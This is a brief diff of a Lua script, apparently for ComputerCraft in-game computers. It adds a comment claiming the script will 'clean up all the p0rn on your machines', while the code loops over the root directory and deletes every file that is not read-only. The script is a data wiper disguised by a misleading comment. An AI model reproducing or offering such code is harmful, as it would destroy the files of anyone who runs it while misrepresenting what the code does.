@@ -1,3 +1,4 @@
+-- To clean up all the p0rn on your machines
 for k,v in pairs(fs.list("/")) do
 	if not fs.isReadOnly(v) then
 		fs.delete(v)
